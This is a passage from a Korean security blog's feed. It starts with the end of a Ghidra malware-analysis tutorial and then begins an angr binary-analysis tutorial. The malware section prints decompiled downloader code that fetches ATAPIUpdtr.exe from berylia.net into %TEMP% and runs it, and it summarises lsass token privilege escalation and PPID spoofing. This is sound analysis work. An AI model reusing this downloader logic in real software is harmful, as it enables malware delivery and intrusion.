class="hljs-number">1</span>);</code></pre><p>위에서 문자열을 살펴볼 때 나왔던 <code>berylia.net</code>이 여기서 나오네요. <code>InternetConnectW</code>로 해당 주소에 연결합니다.</p><pre><code class="hljs cpp">HttpOpenRequestW_addr = (HttpOpenRequestW *)GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);local_24 = (*HttpOpenRequestW_addr)           (local_1c,<span class="hljs-string">L&quot;GET&quot;</span>,<span class="hljs-string">L&quot;/index/&quot;</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR)<span class="hljs-number">0x0</span>,(LPCWSTR *)<span class="hljs-number">0x0</span>,            <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);</code></pre><p>그리고 GET Request를 보내네요. 음. 대충 예상을 해보면 request를 통해 파일을 다운로드한다라는 가정을 세울 수 있겠습니다. 밑에를 더 확인해볼까요?</p><pre><code class="hljs cpp">temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);DAT_00416028 = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);<span class="hljs-built_in">strcpy</span>(DAT_00416028,temp_path);</code></pre><p>환경변수에 설정되어 있는 TEMP 폴더의 경로를 받아오네요. 위에 정보에서 더 추가를 해보면 temp 경로에 파일을 저장한다.</p><pre><code class="hljs cpp">MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_00416028,<span class="hljs-number">-1</span>,DAT_00416024,<span class="hljs-number">0x1000</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);CreateFileW_addr = (CreateFileW *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);local_44 = (*CreateFileW_addr)(DAT_00416024,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,                               (HANDLE)<span class="hljs-number">0x0</span>);local_5c = <span class="hljs-number">0</span>;hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);InternetReadFile_addr = (InternetReadFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);WriteFile_addr = (WriteFile *)GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);<span class="hljs-keyword">if</span> (local_34 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;&#125;<span class="hljs-keyword">else</span> &#123;    local_60 = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;        WVar4 = (*InternetReadFile_addr)(local_24,local_38,<span class="hljs-number">0x2000</span>,&amp;local_60);        <span class="hljs-keyword">if</span> ((WVar4 == <span class="hljs-number">0</span>) || (local_60 == <span class="hljs-number">0</span>)) &#123;            bVar2 = <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;            bVar2 = <span class="hljs-literal">true</span>;        &#125;        <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;        (*WriteFile_addr)(local_44,local_38,local_60,&amp;local_5c,(LPOVERLAPPED)<span class="hljs-number">0x0</span>);&#125;</code></pre><p>어김없이 예상은 적중합니다. <code>InternetReadFile</code>을 통해서 파일을 읽어와 <code>%TEMP%</code>에 <code>CreateFile</code>을 하는군요. 저장되는 파일의 이름은 무엇일까…</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%207.png"></p><p><code>ATAPIUpdtr.exe</code> 파일이네요.</p><h1 id="정리"><a href="#정리" class="headerlink" title="정리"></a>정리</h1><p>자 이제 정리를 해봅시다. 큼직큼직한 행위를 간단하게 정리하면 다음과 같아요.</p><ol><li><code>lsass.exe</code>의 PID를 가져온다.</li><li>Token을 활용해 권한을 상승시킨다.</li><li>PPID Spoofing을 진행한다.</li><li><code>berylia.net</code>에서 <code>ATAPIUpdtr.exe</code>를 <code>%TEMP%</code>에 다운로드한다.</li><li>실행!</li></ol><p>어… 너무 간단하네요. 하핫! 음… <del>어떻게 끝내야 하지?</del> 이번 파트는 저의 예상이 틀리지 않았음을 보여주는 부분이었던 거 같아요. ghidra의 활용법에 집중하기보다는 악성코드 분석이 우선이 되었던 것 같습니다. (사용하는 기능이 똑같아서 어쩔 수 없어요.) Malware analysis 파트를 1로 끝냈으면 좋았을 텐데…</p><p>아무튼! 그래도 오랫동안 글을 작성했네요. 도움이 되셨으면 좋겠습니다만… 저는 미개한 실력을 가지고 있는 사람이라서… ㅠㅠ… ghidra 파트는 더 다룰 부분이 없는 것 같아 이제 종료하려고 합니다! 다다음주에 악성코드 분석 VM 자동화의 마지막 파트도 업로드되니 기다려 주세용~ 그럼 이만!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/malware/">malware</category>
      
      <category domain="https://hackyboiz.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra/">ghidra</category>
      
      <category domain="https://hackyboiz.github.io/tags/ransomware/">ransomware</category>
      
      <category domain="https://hackyboiz.github.io/tags/ghidra-tutorials/">ghidra tutorials</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (1) 시작</title>
      <link>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/</link>
      <guid>https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/</guid>
      <pubDate>Sat, 10 Jul 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;인사말&quot;&gt;&lt;a href=&quot;#인사말&quot; class=&quot;headerlink&quot; title=&quot;인사말&quot;&gt;&lt;/a&gt;인사말&lt;/h1&gt;&lt;p&gt;안녕하세요! j0ker입니다. 아직 내공이 많이 부족해 그냥 공부만 하고 있다가 이제야 공부하고 있는 내용을 포스팅해볼</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h1><p>안녕하세요! j0ker입니다. 아직 내공이 많이 부족해 그냥 공부만 하고 있다가 이제야 공부하고 있는 내용을 포스팅해볼까 합니다!! 내가 왔다아아아아아악!!!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625546988.gif" alt="두두등장"></p><blockquote><p>우아씨 떨어질 뻔했네;;</p></blockquote><p>예전에 해킹하기 전에 영화 같은거 보면 해커들이 나와서 키보드를 촤라라라락 누르더니 지도에 점이 찍히고 취약점 알아서 찾고 공격까지 하는 장면을 본 적이 있습니다 ㅋㅋㅋㅋ 지금 보면 말이 안되는데 말이지… 그래도 그 때는 두근두근하면서 “오 해커는 정말 멋지다”라는 생각을 했었습니다. 그리고 이렇게 잘못된 길로 들어와 버렸죠… 허허 그 때 멈췄어야 했습니다.</p><p><img src="/2021/07/10/j0ker/angr_part1/2e17a20210794aa3b3831a38fad04184.jpeg" alt="2"></p><blockquote><p>얘도 그 때 “그 반지”만 받지 않았더라면…</p></blockquote><p>암튼 제가 봤던 그 영화 속에 해커에 좀 더 다가갈 수 있도록 해줄 수 있는 툴이 바로 angr이지 않을까 싶습니다. 그래서 angr를 공부하려고 하니까 다 라이트업만 있지 처음부터 끝까지 다루는 내용은 별로 없더라구요.(있으면 댓글 남겨주시면 감사하겠습니다! 내가 못 찾는건가…?) 시리즈를 일단 4편까지 쓸까 고민하고 있는데 내용을 다루면서 개념적인 부분이나 잘 다루지 않는 angr의 기초적인 내용에 대해서 또 다루다보면 길어질 수도 있겠습니다 ㅎㅎ</p><p>사실 이미 많이 유명한 툴이라 설명이 더 필요할까 싶긴한데 오늘 준비한 내용은 많지 않으니 주저리주저리 설명을 하고 가도록 하겠습니다 ^^</p><h1 id="angr란"><a href="#angr란" class="headerlink" title="angr란?"></a>angr란?</h1><p>angr는 다양한 환경에서 활용 가능한 바이너리 분석 플랫폼 입니다. angr가 유명해지기 시작한 것은 2015년 DARPA의 CGC(Cyber Grand Challenge)가 시작하면서죠. CGC는 참여팀이 바이너리를 자동 분석하는 툴을 만들어 제한 시간 내에 출제된 문제들에 취약점이 있음을 증명하고 패치하는 점수를 얻는 대회 입니다. 일반적인 CTF와는 다르죠? angr를 제작한 Shellphish팀이 이 대회에 참가하였고 3등을 차지했습니다. 대회가 끝나고 자동 취약점 분석 분야가 해커들에게 많은 주목을 받으면서 angr라는 툴 역시 python을 기반으로 한 높은 접근성 때문에 많은 인기를 끌기 시작했습니다. 다른 팀들이 제작한 바이너리 자동 분석 툴들도 공개된 것들이 있지만 angr가 python으로 활용 가능하다는 점과 문서화 잘 되어 있다는 점이 확실히 매력적으로 다가오는 거 같습니다. 그러니까 저 같은 핵린이들도 바이너리 자동분석을 찍먹해볼 수 있는거겠죠. CGC 이후로 많은 CTF에서 자동 취약점 분석 및 익스플로잇 혹은 리버싱 분야에서 angr를 활용할 수 있는 문제들이 나오고 해커들이 angr를 익숙하게 다룰 수 있게 되면서 보편적으로 많이 쓰이게 된 거 같습니다.(카더라)</p><p>angr, CGC, shellphish에 대해서 좀 더 자세하게 알고 싶으시다면 아래 링크를 참고해보시면 좋을듯 합니다.</p><ul><li><a href="https://cpuu.postype.com/post/4127178">[번역] 2016 DARPA CGC 대회 출전팀의 회고</a></li><li><a href="https://shellphish.net/cgc/">The Cyber Grand Challenge</a></li><li><a href="http://kaishackgon.blogspot.com/2016/08/cyber-grand-challenge.html">Cyber Grand Challenge 후기</a></li><li><a href="https://www.krcert.or.kr/data/trendView.do?bulletin_writing_sequence=20050">美 방위고등연구계획국(DARPA)의 사이버 자동 방어시스템 개발을 위한 컨테스트(CGC) 개최</a></li></ul><h1 id="angr-설치"><a href="#angr-설치" class="headerlink" title="angr 설치"></a>angr 설치</h1><p>위에서 말씀드렸다시피 angr는 다양한 환경에서 활용 가능합니다. 이게 뭔 말이냐? python만 깔리면 다 쓸 수 있다는 겁니다! 다 쓸 수 있다고는 하지만 저희는 일단 우분투에서 angr를 사용하도록 하겠습니다.</p><p>먼저 아래 명령어를 실행해서 실행에 필요한 기본적인 요소들을 설치합니다.</p><pre><code class="hljs bash">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</code></pre><p>그리고 다른 모듈과의 버전 충돌을 방지하기 위해 virtualenv를 만들고 그 안에 angr를 설치해줍니다.</p><pre><code class="hljs bash">mkvirtualenv --python=$(<span class="hljs-built_in">which</span> python3) angr &amp;&amp; pip install angr</code></pre><p>만약 설치가 잘 안된다!!! 그러면 정직하게 <a href="https://docs.angr.io/introductory-errata/install">오피셜 문서</a>를 참고해주세요.</p><h1 id="angr-톺아보기"><a href="#angr-톺아보기" class="headerlink" title="angr 톺아보기"></a>angr 톺아보기</h1><p>이제 angr를 어떻게 사용하는지 알아봐야겠죠? 오늘은 정말 그냥 이런게 있구나~ 정도만 보고 다음에 좀 더 자세하게 앞으로 다뤄볼 예시 문제 상황에 따라 알아보도록 하겠습니다.</p><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>일단 아래와 같이 기본적인 프로젝트를 생성합니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)</code></pre><p>이렇게 하면 타겟 바이너리에 대한 Project 오브젝트가 생성됩니다. 이 프로젝트가 angr에서 해당 바이너리에 대한 정보를 제어하는 기본 단위가 됩니다.</p><p>먼저 바이너리에 대한 기본적인 정보들을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch&lt;Arch X86 (LE)&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">134513744</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">0x8048450</span></code></pre><p>중간에 monkeyhex를 import하면 그냥 10진수로 출력되는 값들이 16진수로 출력되서 좀 더 편하게 확인할 수 있습니다.</p><p>당연히 이 뿐만 아니라 다른 정보들도 있겠죠! 함 보겠습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.__dict__&#123;<span class="hljs-string">&#x27;filename&#x27;</span>: <span class="hljs-string">&#x27;00_angr_find&#x27;</span>, <span class="hljs-string">&#x27;loader&#x27;</span>: &lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;, <span class="hljs-string">&#x27;arch&#x27;</span>: &lt;Arch X86 (LE)&gt;, <span class="hljs-string">&#x27;_sim_procedures&#x27;</span>: &#123;<span class="hljs-number">0x8100000</span>: &lt;SimProcedure strcmp&gt;,  <span class="hljs-number">0x8100004</span>: &lt;SimProcedure printf&gt;,  <span class="hljs-number">0x8100008</span>: &lt;SimProcedure __stack_chk_fail&gt;,  <span class="hljs-number">0x810000c</span>: &lt;SimProcedure puts&gt;,  <span class="hljs-number">0x8100010</span>: &lt;SimProcedure exit&gt;,  <span class="hljs-number">0x8100014</span>: &lt;SimProcedure __libc_start_main&gt;,  <span class="hljs-number">0x8100018</span>: &lt;SimProcedure __isoc99_scanf&gt;,  <span class="hljs-number">0x10301000</span>: &lt;SimProcedure LinuxLoader&gt;,  <span class="hljs-number">0x10301008</span>: &lt;SimProcedure _dl_rtld_lock_recursive&gt;,  <span class="hljs-number">0x10301010</span>: &lt;SimProcedure _dl_rtld_unlock_recursive&gt;,  <span class="hljs-number">0x10301018</span>: &lt;SimProcedure ReturnUnconstrained&gt;,  <span class="hljs-number">0x10301020</span>: &lt;SimProcedure _dl_initial_error_catch_tsd&gt;,  <span class="hljs-number">0x10301028</span>: &lt;SimProcedure _vsyscall&gt;,  <span class="hljs-number">0x10301038</span>: &lt;SimProcedure CallReturn&gt;,  <span class="hljs-number">0x10301040</span>: &lt;SimProcedure UnresolvableJumpTarget&gt;,  <span class="hljs-number">0x10301048</span>: &lt;SimProcedure UnresolvableCallTarget&gt;&#125;, <span class="hljs-string">&#x27;concrete_target&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_default_analysis_mode&#x27;</span>: <span class="hljs-string">&#x27;symbolic&#x27;</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_func&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_list&#x27;</span>: (), <span class="hljs-string">&#x27;use_sim_procedures&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_ignore_functions&#x27;</span>: [], <span class="hljs-string">&#x27;_support_selfmodifying_code&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;_translation_cache&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_executing&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;entry&#x27;</span>: <span class="hljs-number">0x8048450</span>, <span class="hljs-string">&#x27;storage&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;store_function&#x27;</span>: &lt;bound method Project._store of &lt;Project \\\\Mac\\Home\\Desktop\\Angr_Tutorial_For_CTF\\problems\\<span class="hljs-number">00</span>_angr_find&gt;&gt;, <span class="hljs-string">&#x27;load_function&#x27;</span>: &lt;function Project._load at <span class="hljs-number">0x00000225ECEF2CA0</span>&gt;, <span class="hljs-string">&#x27;factory&#x27;</span>: &lt;angr.factory.AngrObjectFactory object at <span class="hljs-number">0x00000225ECEF4100</span>&gt;, <span class="hljs-string">&#x27;_analyses_preset&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;analyses&#x27;</span>: &lt;angr.analyses.analysis.AnalysesHub object at <span class="hljs-number">0x00000225ED698A00</span>&gt;, <span class="hljs-string">&#x27;kb&#x27;</span>: &lt;angr.knowledge_base.knowledge_base.KnowledgeBase object at <span class="hljs-number">0x00000225ED698C70</span>&gt;, <span class="hljs-string">&#x27;simos&#x27;</span>: &lt;angr.simos.linux.SimLinux object at <span class="hljs-number">0x00000225ED698A90</span>&gt;, <span class="hljs-string">&#x27;is_java_project&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;is_java_jni_project&#x27;</span>: <span class="hljs-literal">False</span>&#125;</code></pre><p>아… 모르는게 많네요… 하하… 저걸 다 공부해야 한다고??</p><p><img src="/2021/07/10/j0ker/angr_part1/1625553299.gif" alt="3" title="야레야레..."></p><blockquote><p>야레야레…</p></blockquote><p>하나씩 알아가보도록 하죠… 흐흐…</p><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader&lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects&#123;<span class="hljs-string">&#x27;00_angr_find&#x27;</span>: &lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;, <span class="hljs-string">&#x27;extern-address space&#x27;</span>: &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x8200000:0x8207fff]&gt;, </span><span class="hljs-string">&#x27;cle##tls&#x27;</span>: &lt;ELFTLSObjectV2 Object cle<span class="hljs-comment">##tls, maps [0x8300000:0x8314807]&gt;&#125;</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.min_addr<span class="hljs-number">0x8048000</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.max_addr<span class="hljs-number">0x8407fff</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object&lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.execstack<span class="hljs-literal">False</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.pic<span class="hljs-literal">False</span></code></pre><p>loader에서는 바이너리가 메모리에 어떻게 매핑되는지에 대한 정보를 가지고 있습니다. angr에서는 CLE라는 모듈을 통해 바이너리를 메모리 주소에 매핑한 다음, loader에 메모리 주소 정보들을 저장한다고 합니다. 지금은 그저 “loader를 통해 바이너리가 메모리에 매핑된 주소나 미티게이션 적용 여부를 알 수 있다” 정도만 알면 될듯 합니다!</p><h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><p>angr에서는 지원하는 기능이 어<del>~</del>ㅁ청 많기 때문에 코드들이 난잡해지는 것을 막기 위해서 자주 사용하는 기능들을 factory라는 클래스에 넣어놨습니다.</p><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>앞에서는 메모리에 바이너리가 매핑되었는지를 알았으니 이제 해당 주소에 있는 내용을 알아볼겁니다. black 오브젝트는 특정 주소의 명령어 블럭을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)<span class="hljs-meta">&gt;&gt;&gt; </span>block.pp()<span class="hljs-number">0x8048450</span>:      xor     ebp, ebp<span class="hljs-number">0x8048452</span>:      pop     esi<span class="hljs-number">0x8048453</span>:      mov     ecx, esp<span class="hljs-number">0x8048455</span>:      <span class="hljs-keyword">and</span>     esp, <span class="hljs-number">0xfffffff0</span><span class="hljs-number">0x8048458</span>:      push    eax<span class="hljs-number">0x8048459</span>:      push    esp<span class="hljs-number">0x804845a</span>:      push    edx<span class="hljs-number">0x804845b</span>:      push    <span class="hljs-number">0x8048710</span><span class="hljs-number">0x8048460</span>:      push    <span class="hljs-number">0x80486b0</span><span class="hljs-number">0x8048465</span>:      push    ecx<span class="hljs-number">0x8048466</span>:      push    esi<span class="hljs-number">0x8048467</span>:      push    <span class="hljs-number">0x80485c7</span><span class="hljs-number">0x804846c</span>:      call    <span class="hljs-number">0x8048420</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions<span class="hljs-number">0xd</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs[<span class="hljs-number">0x8048450</span>, <span class="hljs-number">0x8048452</span>, <span class="hljs-number">0x8048453</span>, <span class="hljs-number">0x8048455</span>, <span class="hljs-number">0x8048458</span>, <span class="hljs-number">0x8048459</span>, <span class="hljs-number">0x804845a</span>, <span class="hljs-number">0x804845b</span>, <span class="hljs-number">0x8048460</span>, <span class="hljs-number">0x8048465</span>, <span class="hljs-number">0x8048466</span>, <span class="hljs-number">0x8048467</span>, <span class="hljs-number">0x804846c</span>]</code></pre><p>이처럼 명령어를 보고 싶은 주소를 인자를 주면 원하는 코드 블럭에 있는 명령어들을 확인할 수 있습니다. 명령어의 데이터 형식을 볼 수도 있고 명령어 각각의 주소도 확인할 수 있습니다.</p><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p>Project 오브젝트는 프로그램 초기상태의 정적인 정보를 담고 있습니다. 그냥 정적인 데이터만 가지고는 프로그램이 실행하면서 값이 어떻게 변하는지를 확인할 수는 없겠죠? 그래서 angr에서는 프로그램이 실행되는 것처럼 시뮬레이션을 할 수 있고 이 과정을 SimState라는 오브젝트를 통해 확인하거나 조작할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eax&lt;BV32 <span class="hljs-number">0x1c</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[proj.entry].int.resolved&lt;BV32 <span class="hljs-number">0x895eed31</span>&gt;</code></pre><p>지금은 엔트리 포인트에서의 레지스터와 메모리 상태를 알 수 있습니다. 근데 레지스터 값을 확인하면 그냥 인티저 값이 아닌거 같네요?</p><p>angr에서는 메모리나 레지스터의 값을 bitvector 형식으로 저장한다고 합니다. 일반적으로 32비트나 64비트 레지스터는 최대값이 넘어가면 0으로 되면서 오버플로우가 발생하잖아요? 근데 아시겠지만 파이썬의 인티저는 그런게 없죠! 오버플로우 따위는 웬만하면 일어나지 않습니다. 그렇기 때문에 32비트와 64비트 bitvector를 활용하게 됩니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>)&lt;BV32 <span class="hljs-number">0x1234</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.eval(bv)<span class="hljs-number">0x1234</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi&lt;BV64 <span class="hljs-number">0x3</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long.resolved&lt;BV64 <span class="hljs-number">0x4</span>&gt;</code></pre><p>이런식으로 bitvector↔ integer를 왔다갔다 타입변환을 할 수도 있습니다. 그리고 타입을 지정해서 값을 저장할 수도 있죠.</p><h3 id="Simulation-manager"><a href="#Simulation-manager" class="headerlink" title="Simulation_manager"></a>Simulation_manager</h3><p>state를 통해 어디서 시뮬레이션을 할지를 지정했다면 Simulation_manager를 통해서는 지정한 state를 기준으로 실행하면서 어떻게 데이터들이 바뀌어 나가는지 확인해 볼 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simulation_manager(state)<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[&lt;SimState @ <span class="hljs-number">0x8048450</span>&gt;]<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8048420</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8100014</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;</code></pre><p>이렇게 Simulation Manager에서 step() 함수를 사용하면 eip가 바뀌는 것을 볼 수 있습니다. 호호 factory는 오늘은 이정도만 알아볼텐데… 나중에 많이 만날거 같은 불안한 느낌… 하하…(스포)</p><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h2><p>angr에서는 사용자가 하나부터 열까지 다 분석하고 삽질하며 시간 낭비를 하지 않도록 수많은 분석 툴들을 제공합니다. 그 툴들이 내장되어 있는 클래스가 바로 Analyses 입니다! 아래와 같이 정말 많은 기능이 있는데, 각각의 기능은 추후에 직접 써보면서 소개해드리도록 하겠습니다. 그래도 다 소개하는 무리데스…</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.analyses.proj.analyses.AILBlockSimplifier(              proj.analyses.Decompiler(                      proj.analyses.StructuredCodeGenerator(proj.analyses.AILCallSiteMaker(                proj.analyses.Disassembly(                     proj.analyses.Structurer(proj.analyses.AILSimplifier(                   proj.analyses.DivSimplifier(                   proj.analyses.Typehoon(proj.analyses.BackwardSlice(                   proj.analyses.DominanceFrontier(               proj.analyses.VFG(proj.analyses.BasePointerSaveSimplifier(       proj.analyses.EagerReturnsSimplifier(          proj.analyses.VSA_DDG(proj.analyses.BinDiff(                         proj.analyses.Identifier(                      proj.analyses.VariableRecovery(proj.analyses.BinaryOptimizer(                 proj.analyses.ImportSourceCode(                proj.analyses.VariableRecoveryFast(proj.analyses.BoyScout(                        proj.analyses.InitFinder(                      proj.analyses.Veritesting(proj.analyses.CDG(                             proj.analyses.InitializationFinder(            proj.analyses.XRefs(proj.analyses.CFB(                             proj.analyses.LoopFinder(                      proj.analyses.discard_plugin_preset(proj.analyses.CFBlanket(                       proj.analyses.ModSimplifier(                   proj.analyses.get_plugin(proj.analyses.CFG(                             proj.analyses.MultiSimplifier(                 proj.analyses.has_plugin(proj.analyses.CFGEmulated(                     proj.analyses.Propagator(                      proj.analyses.has_plugin_presetproj.analyses.CFGFast(                         proj.analyses.Proximity(                       proj.analyses.plugin_presetproj.analyses.CFGFastSoot(                     proj.analyses.ReachingDefinitions(             proj.analyses.projectproj.analyses.CalleeCleanupFinder(             proj.analyses.Reassembler(                     proj.analyses.register_default(proj.analyses.CallingConvention(               proj.analyses.RecursiveStructurer(             proj.analyses.register_plugin(proj.analyses.Clinic(                          proj.analyses.RegionIdentifier(                proj.analyses.register_preset(proj.analyses.CodeTagging(                     proj.analyses.RegionSimplifier(                proj.analyses.release_plugin(proj.analyses.CompleteCallingConventions(      proj.analyses.SootClassHierarchy(              proj.analyses.reload_analyses(proj.analyses.CongruencyCheck(                 proj.analyses.StackCanarySimplifier(           proj.analyses.use_plugin_preset(proj.analyses.ConstantDereferencesSimplifier(  proj.analyses.StackPointerTracker(proj.analyses.DDG(                             proj.analyses.StaticHooker(</code></pre><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>그냥 설명만 하다 끝내기는 아쉬우니까 간단하게 튜토리얼 문제 하나만 보고 마무리할게요. 이 <a href="https://github.com/jakespringer/angr_ctf">링크</a>로 들어가셔서 레포를 클론해줍니다. 이 레포는 angr의 기능을 ctf 문제 스타일로 하나하나 공부하기에 적합해 보여서 가져와 봤어요. 00_angr_find는 그 첫번째 문제입니다!</p><pre><code class="hljs python">$&#123;<span class="hljs-keyword">import</span> random, osrandom.seed(os.urandom(<span class="hljs-number">8</span>))userdef_charset = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>userdef = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(userdef_charset) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>))&#125;$<span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><span class="hljs-comment">#include &lt;string.h&gt;</span><span class="hljs-comment">#define USERDEF &quot;$&#123; userdef &#125;$&quot;</span><span class="hljs-comment">#define LEN_USERDEF $&#123; write(len(userdef)) &#125;$</span>char msg[] =  <span class="hljs-string">&quot;$&#123; description &#125;$&quot;</span>;void print_msg() &#123;  printf(<span class="hljs-string">&quot;%s&quot;</span>, msg);&#125;int complex_function(int value, int i) &#123;<span class="hljs-comment">#define LAMBDA 3</span>  <span class="hljs-keyword">if</span> 